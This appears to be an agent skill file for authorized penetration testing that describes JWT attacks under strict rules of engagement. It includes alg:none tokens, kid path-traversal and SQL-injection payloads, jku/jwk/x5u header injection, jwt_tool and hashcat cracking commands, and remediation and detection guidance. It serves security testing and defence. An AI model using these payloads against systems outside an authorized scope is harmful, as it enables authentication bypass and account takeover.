---
name: auth-jwt
description: "JWT attack testing for a pentest-team engagement — algorithm confusion (alg:none, RS256->HS256), signature stripping/tamper, weak HMAC brute-force, kid injection (SQLi/traversal), jku/jwk/x5u header injection, JWKS cache poisoning, and claim-validation bypass (exp/nbf/aud/iss), with jwt_tool automation. Load it when the appsec-triage API testing (JWT) sweep turns up a JWT lead on a claimed web/API/auth target."
---

# JWT Attacks — under the engagement protocol

Deep methodology for the JWT class. You reach here from the `appsec-triage` API testing (JWT) sweep with a lead on an auth/API surface you already own on the board.

## Under the engagement protocol

- **Claimed and in-scope only.** Every crafted token goes to a target you own on the board and that is on the `ROE.md` allowlist — nothing else. A forged token is still a request against a live app.
- **Prove with a marker, not privilege abuse.** Confirm the bypass by minting a token that reaches *your own planted* second account or a single resource, or a header change the server accepts — never ride a forged admin token through real customer data to "demonstrate". No-real-data means the proof is a marker or a hash.
- **OOB / callbacks go to a benign in-scope listener only.** `jku`/`x5u`/`jwk`-URL and JWKS-fetch tests point at your own in-scope callback host — never a live external `attacker.com` pull. A JWKS SSRF is proven by reaching a benign in-scope endpoint, not by exfiltrating cloud metadata.
- **Read before write; escalation is gated.** Confirming a forged token is accepted is read-level proof. Using it to mutate data, chain to RCE, or reach outward-facing systems is destructive/outward-facing — mark the surface blocked and route through the lead to the anchor for the human's explicit go.
- **Rate-limit brute-force.** HMAC cracking is offline once you hold a token — crack locally, never by hammering the endpoint. Coordinate load on shared auth targets; a lockout or WAF ban blocks the whole team.
- **Log and file** per PROTOCOL §Evidence and §Findings — findings in the `appsec-reporting` format, with a re-runnable reproduction (the exact crafted token and the accepting endpoint).

## Quick workflow

1. Locate every JWT the app issues and inspect header + claims.
2. Probe the cheap high-impact bypasses first — `alg:none`, signature stripping, tamper-and-replay.
3. Try algorithm confusion and header injection (`kid`/`jku`/`jwk`/`x5u`) where the key material allows.
4. Crack weak HMAC secrets offline; test claim validation (`exp`/`nbf`/`aud`/`iss`).
5. Confirm impact against a marker account; file with the crafted token and remediation.

## Identify JWT usage

- `Authorization: Bearer eyJ...` headers, cookies, and local/session storage.
- Decode header and payload (Base64URL) — note `alg`, and any `kid`, `jku`, `jwk`, `x5u`, `crit` header params; each is attack surface.

```bash
# split and decode without a network round-trip
echo "$JWT" | cut -d. -f1 | base64 -d 2>/dev/null; echo
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null; echo
```

## Algorithm bypass

### alg:none — signature verification skipped
Some libraries drop verification when `alg` is `none` or a case variant. Set `alg`, keep the body, send an empty signature (trailing dot).
```
{"alg":"none","typ":"JWT"}.<payload>.
{"alg":"None"...  {"alg":"NONE"...  {"alg":"nOnE"...   # try all case variants
```

### Signature stripping / tamper-and-replay
Tamper a claim and replay the original signature; if accepted, verification is broken. Also try truncating/removing the signature segment entirely.

### Algorithm confusion (RS256 -> HS256)
If the server verifies RS256 but a config path lets you switch to HS256, it may use the RSA **public** key as the HMAC secret. Recover the public key (from `/jwks.json`, TLS cert, or two tokens), then HMAC-sign your tampered token with that public key as the secret.
```bash
# public key is in-scope and public by design; re-sign locally
python3 jwt_tool.py "$JWT" -X k -pk public.pem      # key-confusion mode
```

## kid / header injection (point OOB at an in-scope listener only)

`kid` selects the verification key — if it flows into a file read or SQL lookup, it is injectable.
```
{"alg":"HS256","kid":"../../../../dev/null"}   # traversal -> empty key, sign with ""
{"alg":"HS256","kid":"file:///dev/null"}
{"alg":"HS256","kid":"' UNION SELECT 'secret' -- "}   # SQLi -> attacker-known key
```
`jwk` (inline key), `jku`/`x5u` (remote key-set URL) let you supply your own key material. Host the crafted JWKS on your **in-scope** callback host and sign with the matching private key.
```
{"alg":"RS256","jwk":{"kty":"RSA","e":"AQAB","kid":"k","n":"<your-n>"}}
{"alg":"RS256","jku":"https://<in-scope>/.well-known/jwks.json"}
{"alg":"RS256","x5u":"https://<in-scope>/cert.pem"}
{"alg":"RS256","crit":["exp"],"exp":null}    # crit-param ignored -> claim bypass
```
`jku`/`x5u` pointing to an in-scope host also **proves JWKS SSRF** — reaching a benign in-scope endpoint is the proof; never redirect it to cloud metadata or a live external server.

## Weak HMAC secret (crack offline)

Once you hold one valid token, cracking is offline — do not brute the endpoint.
```bash
python3 jwt_tool.py "$JWT" -C -d wordlist.txt        # dictionary crack
hashcat -m 16500 jwt.txt wordlist.txt                # hashcat mode 16500
# c-jwt-cracker for high-speed HMAC brute force
```
On a hit, forge an arbitrary token: change the subject/role to your marker account and confirm acceptance.

## Claim-validation bypass

Test each independently and note which the server ignores:
- Remove or extend `exp` — is an expired/no-exp token accepted?
- Alter `nbf` (not-before), `iat`.
- Change `iss` (issuer) / `aud` (audience) — cross-service token reuse.
- Confusion: send a JWT where an API key/opaque token is expected (and vice versa), or an ID token to a resource server expecting an access token.
```bash
curl -H "X-API-Key: $JWT" https://<in-scope>/resource       # JWT where API key expected
curl -H "Authorization: Bearer $APIKEY" https://<in-scope>/resource
```

## Automation (throttled, in-scope)

```bash
python3 jwt_tool.py "$JWT"                # inspect
python3 jwt_tool.py "$JWT" -M pb          # playbook scan against one in-scope endpoint
python3 jwt_tool.py "$JWT" -X n           # none/null signature
python3 jwt_tool.py "$JWT" -X a           # algorithm confusion
```
Point `-M` at a single claimed endpoint, throttle, and never at a host outside the allowlist. Burp's JWT Editor / JWT Scanner extension works the same manipulations interactively.

## Remediation (for the finding)

1. **Fix** — pin `alg` per client/issuer and reject mismatches; disable `none`; ensure the key loaded for verification matches the `alg` type (never a public key used as an HMAC secret); enforce a strong, high-entropy HMAC secret.
2. **Defense in depth** — always validate `aud`, `iss`, `exp`, `nbf`; reject unknown `crit` params; allowlist `jku`/`x5u` to trusted domains fetched over pinned TLS with short-TTL, `kid`-unique caches; enforce a max token length; keep a server-side `jti` deny-list for revocation; prefer `SameSite` HttpOnly cookies over localStorage; consider PASETO/DPoP/mTLS to remove algorithm negotiation and bind tokens to the client.
3. **Detection** — a log/SIEM rule on `alg:none`, algorithm downgrades, malformed/oversized `kid`, and off-domain `jku`/`x5u` values.

Write it up in the `appsec-reporting` finding format, CWE-347 / A02:2021 Cryptographic Failures, with the crafted-token reproduction.
